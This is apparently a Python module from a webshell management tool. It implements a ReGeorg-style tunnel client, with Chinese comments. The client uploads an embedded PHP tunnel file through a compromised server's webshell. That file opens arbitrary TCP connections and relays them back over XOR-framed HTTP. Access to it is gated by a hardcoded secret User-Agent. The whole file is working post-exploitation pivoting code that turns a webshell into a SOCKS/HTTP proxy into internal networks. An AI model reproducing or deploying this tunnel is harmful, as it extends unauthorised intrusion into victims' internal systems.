"""
ReGeorg 风格 PHP 内存隧道客户端

通过向 PHP webshell 上传一个极小的 tunnel 文件，把 HTTP 请求转成 TCP 隧道，
为 HTTP 代理和 SOCKS5 代理提供稳定的受控端转发能力。
"""

import asyncio
import logging
import os
import struct
import uuid
import typing as t
from urllib.parse import urljoin

import httpx

from .core import exceptions
from .core.base import get_http_client

logger = logging.getLogger("core.regeorg_tunnel")

REGEORG_USER_AGENT = (
    "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3"
)

REGEORG_TUNNEL_PREFIX = "eg_tunnel"

REGEORG_SERVER_PHP = r'''<?php
error_reporting(E_ERROR | E_PARSE);
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
ini_set('always_populate_raw_post_data', -1);

ini_set('session.use_only_cookies', false);
ini_set('session.use_cookies', false);
ini_set('session.use_trans_sid', false);
ini_set('session.cache_limiter', null);
if (array_key_exists('PHPSESSID', $_COOKIE)) {
    session_id($_COOKIE['PHPSESSID']);
} else {
    session_start();
    setcookie('PHPSESSID', session_id());
    session_write_close();
}

@ini_set('zlib.output_compression', 0);
ob_implicit_flush(true);
while (ob_get_level()) {
    ob_end_clean();
}

if (version_compare(PHP_VERSION, '5.4.0', '>=')) @http_response_code(200);

function check_auth()
{
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    if ($ua != 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3') {
        return false;
    }
    if ($_SERVER['CONTENT_TYPE'] == 'application/plain') {
        $read_data = file_get_contents('php://input', 0, null, 0, 32);
        echo $read_data;
        return false;
    }
    return true;
}

function add_client_data($client_id, $data)
{
    $exist = false;
    session_start();
    if (isset($_SESSION[$client_id . '_ok'])) {
        $exist = true;
        $_SESSION[$client_id . '_buf'] .= $data;
    }
    session_write_close();
    return $exist;
}

function close_client_info($client_id)
{
    session_start();
    if (isset($_SESSION[$client_id . '_ok'])) {
        $_SESSION[$client_id . '_ok'] = false;
    };
    session_write_close();
}

function init_client_info($client_id)
{
    session_start();
    $_SESSION[$client_id . '_buf'] = '';
    $_SESSION[$client_id . '_ok'] = true;
    session_write_close();
}

function process_unary()
{
    $body = file_get_contents('php://input');
    $data_map = unmarshal($body);
    $client_id = $data_map['id'];
    $actions = $data_map['ac'];
    if (strlen($actions) != 1) return;
    $action = ord($actions[0]);

    if ($action == 0x02) {
        close_client_info($client_id);
        return;
    } elseif ($action == 0x01) {
        $exist = add_client_data($client_id, $data_map['dt']);
        if (!$exist) {
            echo marshal(new_del());
        }
        return;
    }

    if ($action != 0x00) return;
    header('X-Accel-Buffering: no');
    header('Content-Type: application/octet-stream');
    header("Connection: Keep-Alive");
    set_time_limit(0);

    $host = $data_map['h'];
    $ip = gethostbyname($host);
    $port_str = trim($data_map['p']);
    if ($port_str == '0') {
        $port_str = isset($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : '80';
    }
    $port = intval($port_str);

    $remote_sock = @fsockopen($ip, $port, $errno, $errstr, 3);
    if ($remote_sock) {
        stream_set_blocking($remote_sock, false);
        $read_from = $remote_sock;
        init_client_info($client_id);
        echo marshal(new_status(0x00));
    } else {
        echo marshal(new_status(0x01));
        return;
    }

    $ok_key = $client_id . '_ok';
    $buf_key = $client_id . '_buf';

    $last_buf_time = time();
    while (!feof($read_from)) {
        $remote_data = fread($read_from, 32 * 1024);
        if ($remote_data === false) {
            break;
        }
        if (strlen($remote_data) !== 0) {
            echo marshal(new_data($remote_data));
        }

        session_start();
        if (!isset($_SESSION[$ok_key]) || $_SESSION[$ok_key] !== true) {
            unset($_SESSION[$ok_key]);
            unset($_SESSION[$buf_key]);
            session_write_close();
            break;
        }
        if (strlen($_SESSION[$buf_key]) !== 0) {
            $last_buf_time = time();
            fwrite($read_from, $_SESSION[$buf_key]);
            $_SESSION[$buf_key] = '';
        }

        $client_count = 0;
        foreach ($_SESSION as $key => $value) {
            if (substr($key, -3) == '_ok') {
                $client_count++;
            }
        }
        session_write_close();

        if (time() - $last_buf_time > 60) {
            break;
        }
        usleep(50000);
    }

    session_start();
    unset($_SESSION[$ok_key]);
    unset($_SESSION[$buf_key]);
    session_write_close();
    fclose($read_from);
    echo marshal(new_del());
}

function marshal($m)
{
    $buf = '';
    foreach ($m as $key => $value) {
        $buf .= chr(strlen($key)) . $key . pack('N', strlen($value)) . $value;
    }
    $xor_key = chr(mt_rand(0, 255));
    $data = '';
    for ($i = 0; $i < strlen($buf); $i++) {
        $data .= chr(ord($buf[$i]) ^ ord($xor_key));
    }
    return pack('N', strlen($data)) . $xor_key . $data;
}

function unmarshal($body)
{
    $len = unpack('N', substr($body, 0, 4))[1];
    $xor = ord(substr($body, 4, 1));
    $data = substr($body, 5);
    if ($len > 1024 * 1024 * 32) {
        throw new Exception('invalid len');
    }
    if (strlen($data) != $len) {
        throw new Exception('invalid data');
    }
    $decoded = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $decoded .= chr(ord($data[$i]) ^ $xor);
    }
    $m = array();
    $i = 0;
    while ($i < strlen($decoded) - 1) {
        $k_len = ord($decoded[$i]);
        $i++;
        if ($k_len < 0 || $i + $k_len >= strlen($decoded)) break;
        $key = substr($decoded, $i, $k_len);
        $i += $k_len;
        if ($i + 4 >= strlen($decoded)) break;
        $v_len = unpack('N', substr($decoded, $i, 4))[1];
        $i += 4;
        if ($v_len < 0 || $i + $v_len > strlen($decoded)) break;
        $value = substr($decoded, $i, $v_len);
        $i += $v_len;
        $m[$key] = $value;
    }
    return $m;
}

function new_del()
{
    return array('ac' => chr(0x02));
}

function new_status($b)
{
    return array('s' => chr($b));
}

function new_data($data)
{
    return array('ac' => chr(0x01), 'dt' => $data);
}

if (check_auth()) {
    try {
        process_unary();
    } catch (Exception $ex) {
    }
}
'''


def _marshal(data: t.Dict[str, t.Union[str, bytes]]) -> bytes:
    """把字典编码成 ReGeorg 帧。"""
    buf = b""
    for key, value in data.items():
        key_b = key.encode("ascii")
        value_b = value if isinstance(value, bytes) else value.encode("latin1")
        buf += bytes([len(key_b)]) + key_b + struct.pack(">I", len(value_b)) + value_b
    xor_key = os.urandom(1)[0]
    enc = bytes([b ^ xor_key for b in buf])
    return struct.pack(">I", len(enc)) + bytes([xor_key]) + enc


def _unmarshal_one(buf: bytes) -> t.Tuple[t.Optional[t.Dict[str, bytes]], bytes]:
    """从缓冲区解析一个 ReGeorg 帧，返回 (frame, remaining)。"""
    if len(buf) < 5:
        return None, buf
    frame_len = struct.unpack(">I", buf[:4])[0]
    if len(buf) < 5 + frame_len:
        return None, buf
    xor_key = buf[4]
    enc = buf[5 : 5 + frame_len]
    dec = bytes([b ^ xor_key for b in enc])
    pos = 0
    result: t.Dict[str, bytes] = {}
    while pos < len(dec):
        if pos + 1 > len(dec):
            break
        k_len = dec[pos]
        pos += 1
        if pos + k_len > len(dec):
            break
        key = dec[pos : pos + k_len].decode("latin1")
        pos += k_len
        if pos + 4 > len(dec):
            break
        v_len = struct.unpack(">I", dec[pos : pos + 4])[0]
        pos += 4
        if pos + v_len > len(dec):
            break
        result[key] = dec[pos : pos + v_len]
        pos += v_len
    return result, buf[5 + frame_len :]


class ReGeorgSocket:
    """ReGeorg 隧道上的一个 TCP socket。"""

    def __init__(self, tunnel_url: str, client: httpx.AsyncClient):
        self.tunnel_url = tunnel_url
        self.client = client
        self.client_id = uuid.uuid4().hex[:16]
        self._resp: t.Optional[httpx.Response] = None
        self._queue: asyncio.Queue[t.Optional[t.Dict[str, bytes]]] = asyncio.Queue()
        self._reader_task: t.Optional[asyncio.Task] = None
        self._closed = False

    async def connect(self, host: str, port: int) -> bool:
        """打开远程 TCP 连接，返回是否成功。"""
        req = _marshal({"id": self.client_id, "ac": b"\x00", "h": host, "p": str(port)})
        try:
            self._resp = await self.client.send(
                self.client.build_request(
                    "POST",
                    self.tunnel_url,
                    content=req,
                    headers={"Content-Type": "application/octet-stream"},
                ),
                stream=True,
            )
        except Exception as exc:
            logger.warning("ReGeorg CONNECT 请求失败: %s", exc)
            return False

        self._reader_task = asyncio.create_task(self._reader_loop())
        try:
            first = await asyncio.wait_for(self._queue.get(), timeout=10)
        except asyncio.TimeoutError:
            logger.warning("ReGeorg CONNECT 等待状态超时")
            await self.close()
            return False

        if first is None:
            return False
        status = first.get("s")
        if status != b"\x00":
            logger.warning("ReGeorg CONNECT 目标拒绝, status=%r", status)
            await self.close()
            return False
        return True

    async def _reader_loop(self):
        buf = b""
        try:
            async for chunk in self._resp.aiter_bytes():  # type: ignore
                buf += chunk
                while True:
                    frame, buf = _unmarshal_one(buf)
                    if frame is None:
                        break
                    await self._queue.put(frame)
                    if frame.get("ac") == b"\x02":
                        return
        except Exception as exc:
            logger.debug("ReGeorg 读流结束: %s", exc)
        finally:
            await self._queue.put(None)

    async def read(self, max_bytes: int = 32 * 1024) -> bytes:
        """读取远程 socket 发来的数据。返回 b'' 表示连接已关闭。"""
        if self._closed:
            return b""
        try:
            frame = await asyncio.wait_for(self._queue.get(), timeout=60)
        except asyncio.TimeoutError:
            return b""
        if frame is None:
            return b""
        if frame.get("ac") == b"\x02":
            self._closed = True
            return b""
        return frame.get("dt", b"")

    async def write(self, data: bytes) -> None:
        """向远程 socket 写入数据。"""
        if self._closed or not data:
            return
        req = _marshal({"id": self.client_id, "ac": b"\x01", "dt": data})
        try:
            await self.client.post(
                self.tunnel_url,
                content=req,
                headers={"Content-Type": "application/octet-stream"},
            )
        except Exception as exc:
            logger.warning("ReGeorg FORWARD 失败: %s", exc)
            self._closed = True

    async def close(self) -> None:
        if self._closed:
            return
        self._closed = True
        req = _marshal({"id": self.client_id, "ac": b"\x02"})
        try:
            await self.client.post(
                self.tunnel_url,
                content=req,
                headers={"Content-Type": "application/octet-stream"},
            )
        except Exception as exc:
            logger.debug("ReGeorg CLOSE 发送失败(通常可忽略): %s", exc)
        if self._reader_task is not None:
            self._reader_task.cancel()


class ReGeorgTunnel:
    """管理一个 session 对应的 ReGeorg 隧道文件和 HTTP client。"""

    def __init__(self, session):
        self.session = session
        self.tunnel_url: t.Optional[str] = None
        self.filename: t.Optional[str] = None
        self._client: t.Optional[httpx.AsyncClient] = None

    async def _ensure_uploaded(self) -> str:
        if self.tunnel_url is not None:
            return self.tunnel_url

        pwd = await self.session.get_pwd()
        if not pwd:
            raise exceptions.ServerError("无法获取 webshell 当前目录")

        if self.filename is None:
            self.filename = f"{REGEORG_TUNNEL_PREFIX}_{uuid.uuid4().hex[:12]}.php"

        filepath = pwd.rstrip("/") + "/" + self.filename
        try:
            ok = await self.session.upload_file(filepath, REGEORG_SERVER_PHP.encode("utf-8"))
        except Exception as exc:
            raise exceptions.ServerError(f"上传 ReGeorg 隧道文件失败: {exc}") from exc
        if not ok:
            raise exceptions.ServerError("上传 ReGeorg 隧道文件返回失败")

        # 从 webshell URL 推导出 tunnel URL
        base_url = getattr(self.session, "url", None)
        if not base_url:
            raise exceptions.ServerError("session 缺少 url 配置")
        self.tunnel_url = urljoin(base_url, self.filename)

        session_conn = {"proxy": getattr(self.session, "proxy", None) or None}
        self._client = get_http_client(session_conn, timeout=httpx.Timeout(3600))
        # 覆盖 UA，并把 tunnel 需要的 cookie 持久化在这个 client 里
        self._client.headers["User-Agent"] = REGEORG_USER_AGENT
        logger.info("ReGeorg tunnel uploaded: %s", self.tunnel_url)
        return self.tunnel_url

    async def open_socket(self) -> ReGeorgSocket:
        tunnel_url = await self._ensure_uploaded()
        return ReGeorgSocket(tunnel_url, self._client)

    async def close(self) -> None:
        if self._client is not None:
            await self._client.aclose()


# 每个 session 复用同一个 tunnel，避免重复上传
tunnel_cache: t.Dict[str, ReGeorgTunnel] = {}


async def get_tunnel(session, session_id: t.Optional[str] = None) -> ReGeorgTunnel:
    key = session_id or str(id(session))
    if key not in tunnel_cache:
        tunnel_cache[key] = ReGeorgTunnel(session)
    return tunnel_cache[key]


def release_tunnel(session_id: str) -> None:
    tunnel = tunnel_cache.pop(session_id, None)
    if tunnel is not None:
        asyncio.create_task(tunnel.close())
